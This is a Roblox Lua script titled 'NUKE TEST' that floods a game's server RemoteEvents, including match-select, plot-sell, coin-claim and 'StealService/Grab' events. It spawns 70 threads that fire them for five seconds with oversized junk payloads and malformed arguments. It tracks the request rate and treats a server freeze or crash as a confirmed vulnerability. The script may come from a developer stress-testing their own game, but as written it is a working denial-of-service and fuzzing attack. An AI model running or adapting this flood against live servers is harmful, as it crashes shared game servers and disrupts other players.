--[[
    ☢️ NUKE TEST ☢️
    ===============
    Absolute maximum aggression. No mercy. Pure chaos.
    
    Runs for 5 seconds and tries to break everything.
]]

local RS = game:GetService("ReplicatedStorage")
local Net = require(RS.Packages.Net)
local Http = game:GetService("HttpService")

-- Grab all remotes
local r = {}
pcall(function() r[1] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Accept") end)
pcall(function() r[2] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Ready") end)
pcall(function() r[3] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Cancel") end)
pcall(function() r[4] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Select") end)
pcall(function() r[5] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Vote") end)
pcall(function() r[6] = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/TeleportBack") end)
pcall(function() r[7] = Net:RemoteEvent("DuelsMachineService/ReconnectWarn") end)
pcall(function() r[8] = Net:RemoteEvent("DuelsMachineService/Reconnect") end)
pcall(function() r[9] = Net:RemoteEvent("PlotService/Sell") end)
pcall(function() r[10] = Net:RemoteEvent("PlotService/Open") end)
pcall(function() r[11] = Net:RemoteEvent("PlotService/ClaimCoins") end)
pcall(function() r[12] = Net:RemoteEvent("StealService/Grab") end)

-- Garbage generators
local function junk() 
    return {
        Index = string.rep("X", math.random(100, 10000)),
        UUID = Http:GenerateGUID(false),
        M = string.rep("Y", math.random(100, 5000)),
        T = {string.rep("Z", 1000), string.rep("W", 1000)},
    }
end

local function bigJunk()
    local t = {}
    for i = 1, 500 do t[i] = string.rep("A", 2000) end
    return {Index = "X", UUID = "Y", Data = t}
end

local modes = {"Bat Only", "Bat + Medusa", "All Gears", "", nil, 123, {}, true}
local slots = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, -1, 999, "1", nil}

print("☢️ NUKE TEST STARTED ☢️")
print("Duration: 5 seconds of pure chaos")
print("")

local count = 0
local go = true

-- Spawn 50 chaos threads
for _ = 1, 50 do
    task.spawn(function()
        while go do
            -- Fire everything at once, no pcall for speed
            for _, remote in pairs(r) do
                if remote then
                    pcall(function()
                        remote:FireServer()
                        remote:FireServer(slots[math.random(#slots)])
                        remote:FireServer(slots[math.random(#slots)], junk())
                        remote:FireServer(modes[math.random(#modes)])
                        remote:FireServer(bigJunk())
                    end)
                    count = count + 5
                end
            end
        end
    end)
end

-- Additional pure spam threads
for _ = 1, 20 do
    task.spawn(function()
        while go do
            if r[1] then pcall(function() r[1]:FireServer() end) count = count + 1 end
            if r[2] then pcall(function() r[2]:FireServer() end) count = count + 1 end
            if r[4] then pcall(function() r[4]:FireServer(1, junk()) end) count = count + 1 end
        end
    end)
end

-- Stats
task.spawn(function()
    local start = tick()
    while go do
        print(string.format("☢️ Requests: %d | Rate: %.0f/sec", count, count / (tick() - start)))
        task.wait(0.5)
    end
end)

-- Stop after 5 seconds
task.delay(5, function()
    go = false
    task.wait(0.2)
    print("")
    print("☢️ NUKE COMPLETE ☢️")
    print("Total requests sent: " .. count)
    print("If you can read this, server survived.")
    print("If server froze/crashed, vulnerability confirmed.")
end)

return {getCount = function() return count end}
